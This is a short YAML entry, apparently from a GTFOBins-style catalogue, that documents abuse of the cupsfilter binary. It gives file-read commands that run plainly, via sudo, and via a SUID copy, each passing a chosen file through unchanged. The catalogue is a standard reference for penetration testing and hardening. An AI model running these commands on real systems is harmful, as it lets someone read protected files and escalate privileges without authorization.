---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
  suid:
    - code: |
        LFILE=file_to_read
        ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
---
